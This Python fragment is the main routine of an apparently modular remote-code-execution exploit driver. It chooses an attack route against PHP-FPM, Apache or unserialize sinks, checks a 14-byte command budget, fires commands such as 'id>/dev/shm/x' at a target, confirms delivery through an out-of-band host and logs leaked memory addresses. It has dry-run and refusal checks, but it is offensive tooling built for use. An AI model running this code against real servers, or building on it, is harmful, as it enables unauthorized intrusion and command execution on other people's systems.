        decision = select_route(fp, sinks, want_multi, args.allow_81_83, log)
    except Ambiguous as e:
        log("-" * 72)
        log(f"[AMBIGUOUS -- STOPPING, not guessing] {e}")
        return 2

    print_decision(decision, log)

    base_cmd = args.cmd.encode("latin-1")
    _warn_cmd_budget(decision, base_cmd, args.oob_host, log)

    campaign_cmds = args.cmd_list
    if args.campaign > 0 and not campaign_cmds:
        campaign_cmds = [args.cmd] * args.campaign

    if not args.fire:
        log("[dry-run] decision shown above. Re-run with --fire to execute.")
        if decision["route"] == "config_routes":
            log("[dry-run] (no unserialize sink: config routes are report-only "
                "here; run them with their own modules.)")
        return 0

    if decision["route"] == "config_routes":
        log("[fire] refusing to auto-fire config routes -- run the named module "
            "directly with its own flags.")
        return 2

    # ---- a7 fire budget pre-check: refuse cleanly (the underlying modules
    #      hard-ASSERT at 14B; catch it here with a clear operator message
    #      instead of a traceback). ----
    FIRE_ROUTES = {"fpm_offsets_fire", "fpm_echo_route", "remote_rce_campaign",
                      "apache_remote_rce"}
    if decision["route"] in FIRE_ROUTES:
        to_check = campaign_cmds or [args.cmd]
        toolong = [c for c in to_check if len(c.encode("latin-1")) > 14]
        if toolong:
            log(f"[fatal] the a7 fire budget is <=14 bytes per command "
                f"(after the GC byte). Too long: {toolong}. Use a short marker "
                f"(e.g. `id>/dev/shm/x`, 13B, already exit-0). Retrieving longer "
                f"output needs the long-command finisher (out of this "
                f"driver's assembly scope).")
            return 2

    # ---- Phase 3: execute + verify ----
    log("-" * 72)
    result = run_route(decision, fp, sinks, base_cmd, args.oob_host,
                       args.oob_path, args.fire_retries, campaign_cmds,
                       args.fence, args.spray_probe, log)

    log("=" * 72)
    log(f"[report] route={result['route']} fire_mode={result['fire_mode']}")
    log(f"[report] delivered={result['delivered']}  verified={result['verified']}")
    log(f"[report] evidence: {result['evidence']}")
    if result["detail"]:
        for k, v in result["detail"].items():
            if v is not None:
                vv = hex(v) if isinstance(v, int) and k in (
                    "binbase", "chunk", "system") else v
                log(f"[report]   {k} = {vv}")
    # Exit 0 only if delivered AND not an explicit failed-fire verdict.
    if result["verified"] is False:
        return 1
    return 0 if result["delivered"] else 1


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
